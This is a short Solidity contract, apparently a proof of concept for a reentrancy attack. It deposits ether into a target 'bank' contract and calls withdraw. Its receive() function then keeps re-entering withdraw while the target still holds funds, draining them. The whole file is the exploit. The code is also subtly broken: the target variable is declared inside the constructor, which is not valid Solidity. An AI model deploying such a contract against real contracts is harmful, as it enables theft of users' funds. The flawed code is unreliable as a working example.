interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {

    constructor(address _target) {
        IBank public target;
        target = IBank(_target);
    }

    function setup() external payable {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}